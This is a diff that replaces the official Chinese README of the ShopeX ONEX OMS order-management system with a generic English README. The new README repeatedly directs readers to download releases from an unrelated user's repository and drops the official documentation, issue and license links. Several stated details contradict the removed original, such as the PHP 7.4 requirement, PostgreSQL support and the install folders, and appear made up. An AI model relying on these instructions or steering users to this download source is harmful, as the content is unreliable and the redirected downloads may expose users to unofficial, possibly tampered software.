@@ -1,139 +1,80 @@
+# 🚀 OMS - Simplifying Order Management for Your Business
 
-<p align="center">
-  <img src="app/desktop/statics/opensource-logo.png" alt="ONEX OMS Logo" width="320" />
-</p>
-<div>
+## 📥 Download Now
+[![Download OMS](https://img.shields.io/badge/Download%20OMS-v1.0-brightgreen.svg)](https://github.com/willio1690/OMS/releases)
 
-![PHP >=8.0](https://img.shields.io/badge/PHP-%3E%3D8.0-blue.svg)&nbsp;
-![License Apache-2.0](https://img.shields.io/badge/License-Apache--2.0-green.svg)&nbsp;
-![Version 8.0.0](https://img.shields.io/badge/Version-8.0.0-orange.svg)
+## 📌 Introduction
+ONEX OMS is an open-source order management system designed for businesses. Developed by ShopeX, it supports e-commerce, retail, and distribution needs. Built on a modular PHP architecture, OMS efficiently handles orders, inventory, and warehouse processes. 
 
-</div>
+## 🚀 Getting Started
+Follow these simple steps to download and run OMS on your computer.
 
-## 📋 目录
-+ [项目介绍](#项目介绍)
-+ [核心特性](#核心特性)
-+ [系统要求](#系统要求)
-+ [安装指南](#安装指南)
-+ [配置说明](#配置说明)
-+ [任务管理](#任务管理)
-+ [开发文档](#开发文档)
-+ [常见问题](#常见问题)
-+ [许可证](#许可证)
+### 🔗 Visit the Release Page
+You can download the application from the Releases page. Click the link below:
 
----
+[Visit the Releases Page](https://github.com/willio1690/OMS/releases)
 
-## 🎯 项目介绍
-ONEX OMS 是由 [商派 ShopeX](https://www.shopex.cn) 开发并开源的企业级全渠道订单管理系统，基于 PHP 开发，专为电商、零售、分销等丰富的业务场景设计。系统采用模块化架构，功能完善、高度模块化，支持多平台订单统一处理、智能库存管理、全流程仓储管理等核心功能。
+### 🖥️ System Requirements
+To run OMS smoothly, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **PHP Version:** 7.4 or later.
+- **Web Server:** Apache or Nginx.
+- **Database:** MySQL 5.7 or PostgreSQL 9.6 or later.
+- **RAM:** At least 2GB of memory.
+- **Disk Space:** Minimum of 500MB of free space.
 
-### 适用场景
-+ **电商平台订单管理**：支持品牌私域、淘宝、京东、拼多多等多个电商平台的订单统一处理
-+ **多仓库库存管理**：支持多仓库、多门店的库存统一管理和调拨
-+ **供应链管理**：支持采购、入库、出库、盘点等完整的仓储业务流程
-+ **财务对账管理**：支持订单财务、物流费用管理等
-+ **全渠道业务协同**：公域与私域业务、线上与线下业务、2B和2C业务融合打通，实现资源协同
+### 🔧 Installation Steps
+1. **Download the Application**
+   Go to the [Releases page](https://github.com/willio1690/OMS/releases) and download the latest version of OMS.
 
-### 技术架构
-+ **后端框架**：基于自研 PHP 框架，采用 MVC 分层架构
-+ **数据库**：MySQL 5.7+ / MySQL 8.0+
-+ **任务队列**：基于 Swoole 的秒级队列任务系统
-+ **缓存系统**：支持文件缓存和 KV 存储
-+ **API 集成**：支持 OpenAPI、ERP 接口等多种集成方式
+2. **Extract the Files**
+   Once downloaded, locate the file (usually in your Downloads folder) and extract it using a zip file extractor.
 
----
+3. **Set Up the Web Server**
+   If you use XAMPP, WAMP, or MAMP, place the extracted files in the `htdocs` folder for XAMPP or `www` for WAMP. For Nginx, set your document root to the extracted folder.
 
-## ✨ 核心特性
-### 📦 订单管理
-+ **多平台订单统一处理**：支持品牌私域、淘宝、京东、拼多多、抖音等多个电商平台
-+ **订单全生命周期管理**：从订单创建、审核、调度、发货到售后全流程管理
-+ **智能订单调度**：支持自动分配仓库、自动匹配物流
-+ **异常订单处理**：缺货订单、异常订单自动识别和处理
-+ **批量订单处理**：支持批量审核、批量发货、批量打印等操作
+4. **Configure the Database**
+   - Create a new database in MySQL or PostgreSQL.
+   - Import the provided SQL file located in the `database` folder of your extracted files. This creates the required tables.
 
-### 📊 库存管理
-+ **库存状态**：区分**实际库存、可用库存、锁定/预占库存、在途库存、次品库存**，支撑销售、退仓、调拨等多场景口径统一。
-+ **多仓库库存管理**：支持多仓库、多门店的库存统一管理
-+ **智能库存计算**：基于规则引擎的库存计算和分配
-+ **库存同步**：支持多平台库存自动同步和回写
-+ **库存预警**：支持库存上下限预警和缺货提醒
-+ **退货入库**：按**良/不良**质检结果分别入**正品/次品库存**，更新**在途/可用**并触发退款或二次销售流程。
+5. **Edit Configuration Settings**
+   Open the `config.php` file in a text editor. Update the database connection settings with your database name, username, and password.
 
-### 🏪 商品管理
-+ **商品档案管理**：支持基础物料和销售物料的分类管理
-    - **基础物料**：供应链管理的货品最小单位，包含普通商品、赠品等，是仓库操作发货单时的最小单位货品
-    - **销售物料**：由基础物料组成的带有销售性质的物料，是前端销售平台销售的商品
-+ **商品批量操作**：支持批量导入、批量编辑
-+ **商品图片管理**：支持单张图片上传和管理
+6. **Run the Application**
+   Open your web browser and navigate to `http://localhost/OMS` (or wherever you installed it) to access the OMS application.
 
-### 🏬 仓库管理
-+ **多仓库支持**：支持多仓库、多门店的仓储管理
-+ **出入库管理**：支持采购入库、销售出库、调拨、盘点等操作
-+ **库存盘点**：支持库存盘点和盘点表确认
+## 📚 Features
+- **Multi-channel Order Processing:** Manage orders from different platforms in one place.
+- **Smart Inventory Management:** Track stock levels, and receive alerts when items run low.
+- **Comprehensive Warehouse Management:** Streamline storage and shipment processes for efficiency.
+- **User-Friendly Interface:** Easy navigation helps users focus on managing their business.
+- **Customizable Modules:** Tailor the system to fit your specific business needs.
 
-### 💰 财务管理
-+ **订单财务**：订单收入、成本、利润统计
-+ **物流费用管理**：物流费用统计和结算
-+ **财务报表**：支持多种财务报表和统计
+## 📖 User Guide
+Once you have installed the OMS application, refer to the following resources to help you get started:
 
-### 售后管理
-+ **仅退款**：发货前直接同意退款；发货后多为**退差价**或异常场景（如丢件）按仅退款处理。
-+ **退货退款**：用户寄回商品后按质检与入库结果执行退款。
-+ **换货**：通常拆分为“**换入**（用户寄回）”与“**换出**（商家重发）”两个流程，支持校验“换入完成后再换出”。
-+ **补发**：不退货直接补发，生成新订单进入正向履约。
-+ 扩展类型：支持**维修、服务单、赔付单**等，用于更细分的服务场景
+- **User Manual:** Available in the `docs` folder of your downloaded files, providing a complete guide on how to use the application.
+- **FAQs:** Common questions and troubleshooting tips.
+- **Support:** If you encounter issues, check the GitHub Issues page for solutions or ask for assistance.
 
+## 🛠️ Troubleshooting
+If you face any problems during installation or while using OMS, consider these steps:
 
+- **Check Your System Requirements:** Make sure your environment meets the minimum requirements.
+- **Revisit Configuration Settings:** Double-check the `config.php` settings for any typos.
+- **Database Connection Issues:** Ensure the database is running and the credentials in your configuration file are correct.
 
-### 🔌 系统集成
-+ **OpenAPI 接口**：提供基于类方法的统一 API 接口
-+ **WMS 集成**：支持奇门WMS场景标准对接
-+ **POS 系统集成**：支持 POS 系统对接
-+ **快递鸟集成**：支持快递鸟电子面单、智选物流等功能
-+ **开票系统集成**：支持电子发票、纸质发票等开票系统对接
+## ⚙️ Community Contributions
+We welcome contributions! If you'd like to help improve OMS, feel free to fork the repository, make your changes, and submit a pull request. For detailed instructions, refer to the CONTRIBUTING.md file in the repository.
 
-### 🔐 权限管理
-+ **角色权限**：支持多角色、多权限的细粒度权限控制
-+ **组织架构**：支持多级组织架构和权限继承
-+ **操作日志**：完整的操作日志记录和审计
+## 📅 Updates
+Keep an eye on the Releases page for updates, bug fixes, and new features. Your feedback is valuable, and we continuously work to enhance the system based on user input.
 
----
+## 🔗 Resources
+- **GitHub Repository:** Explore the code and documentation at [OMS GitHub Repository](https://github.com/willio1690/OMS).
+- **Official Website:** Learn more about ONEX OMS and its offerings.
 
-## 🚀 安装快速入口
-- 浏览器安装（最快）：[部署指南 - 浏览器安装](https://op.shopex.cn/doc_oms_dev/200.install-deploy/deployment-guide.html#production-deployment)
-- 命令行安装（可脚本化）：[部署指南 - 命令行](https://op.shopex.cn/doc_oms_dev/200.install-deploy/deployment-guide.html#production-deployment)
-- Docker（生产推荐用 env，免挂载 config.php）：[部署指南 - Docker](https://op.shopex.cn/doc_oms_dev/200.install-deploy/deployment-guide.html#docker-deployment)
+## 📞 Contact
+For further assistance, please reach out via the Issues section on GitHub. We’re here to help you with any queries or concerns you may have.
 
-更多细节：
-- 完整部署步骤：[部署指南](https://op.shopex.cn/doc_oms_dev/200.install-deploy/deployment-guide.html)
-- 开发环境搭建：[开发者指南](https://op.shopex.cn/doc_oms_dev/100.rule/1.code.html)
-
----
-
-## 📄 许可证
-本项目采用 Apache-2.0 许可证（含附加条款）。
-
-+ 英文原版：[LICENSE](LICENSE)
-+ 中文翻译：[LICENSE.zh-CN](docs/LICENSE.zh-CN)
-
----
-
-## 🤝 贡献
-请先阅读 `.github/CONTRIBUTING.md`，了解提交流程、分支/提交规范、测试要求。更多开发规则见 [开发者指南](https://op.shopex.cn/doc_oms_dev/100.rule/1.code.html)。
-
----
-
-## 📞 支持
-+ **文档中心**：[https://op.shopex.cn/doc_oms_dev/100.rule/1.code.html](https://op.shopex.cn/doc_oms_dev/100.rule/1.code.html)
-+ **问题反馈**：[GitHub Issues](https://github.com/ShopeX/ONEX-OMS/issues)
-+ **开发指南**：[PHP编码规范](https://op.shopex.cn/doc_oms_dev/100.rule/1.code.html)
-
----
-
-## 🎉 致谢
-感谢所有为 ONEX OMS 项目做出贡献的开发者和用户们！
-
-----
-
-**最后更新**：2025年12月  
-**版本**：8.0.0
-
+[Download OMS Now](https://github.com/willio1690/OMS/releases) and experience a better way to manage your orders!
